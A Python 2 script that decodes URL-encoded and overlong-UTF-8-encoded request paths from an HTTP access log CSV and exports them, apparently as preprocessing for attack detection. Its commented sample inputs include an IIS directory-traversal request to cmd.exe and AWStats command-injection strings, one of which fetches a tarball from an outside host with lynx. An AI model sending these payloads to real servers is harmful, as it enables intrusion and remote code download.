import re
import csv
from urllib import unquote

# data1 = ['/']
# data2 = ['/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir']
# data3 = ['/cgi bin/awstats.pl?configdir=%7cecho%20%3becho%20b_exp%3bcd%20%2ftmp%3blynx%20%2dsource%20www%2emaveric%2ecom%2ft%2etgz%20%3e%20t%2etgz%3bls%20%2dal%3becho%20e_exp%3b%2500']
# data4 = ['/cgi bin/awstats.pl?configdir=%7cecho%20%3becho%20b_exp%3bcd%20%2ftmp%3bls%20%2dal%3becho%20e_exp%3b%2500']

def unquote_u(s):
	# hex_pat = re.compile(r'(?<=\%)[abcdef]\w|(?<=\%)[0189]\w|(?<=\%)7f|(?<=\%)2f')
	# ref utf-8: https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work
	hex_pat = re.compile(r'\%[abcdef]\w|\%[0189]\w|(?<=\%c\w)\%2f')
	if hex_pat.search(s[0]):
		s = map(lambda item: item.strip('%2500'), s) # %2500 means null
		hex_pat2 = re.compile(r'\%c\w\%[0189]\w|\%c\w\%\w\w')
		hex_str = hex_pat.findall(s[0])
		hex_str = map(lambda item: item[1:], hex_str)
		hex_int = int(hex_str[0]+hex_str[1], 16)
		bin_hex = str(bin(hex_int)[2:].zfill(16))
		decode_int = int(bin_hex[2:8]+bin_hex[-6:], 2)
		# hex_num = map(lambda item: int('0x' + item, 16), hex_str)
		# print hex_num
		# int_hex = (hex_num[0] - int(0xc0)) * int(0x40) + hex_num[1]
		# print int_hex
		# if int_hex > 127:
		# 	decode_int = int(bin(int_hex)[2:].zfill(16)[-6:], 2)
		# elif int_hex <= 127:
		# 	decode_int = int_hex
		decode_hex = '%' + hex(decode_int)[2:]
		s = map(lambda item: hex_pat2.sub(decode_hex, item), s)
		data = map(lambda item: unquote(item), s)
	else: 
		s = map(lambda item: item.strip('%2500'), s) # %2500 means null
		data = map(lambda item: unquote(item), s)
	return data

def main():
	file="/home/hduser/Desktop/normailized_log/http_access_header.csv"
	with open(file, 'rb') as f:
	    reader = csv.reader(f)
	    datalist = map(tuple, reader)
	    
	    dataset = []
	    for sublist in datalist:
	    	sublist = sublist[0].strip(',')
	    	sublist = [sublist]
	    	data = unquote_u(sublist)
	    	datalist = unquote(data[0])
	    	datalist = [datalist]
	    	dataset.append(datalist)
	    return dataset	

if __name__ == "__main__":
    dataset = main()
    print dataset

csvfile ="/home/hduser/Desktop/normailized_log/http_access_header_import.csv"
with open(csvfile, "w") as output:
    writer = csv.writer(output, lineterminator='\n')
    for alist in dataset:
        writer.writerow(alist) 
print "successully exported to csv!"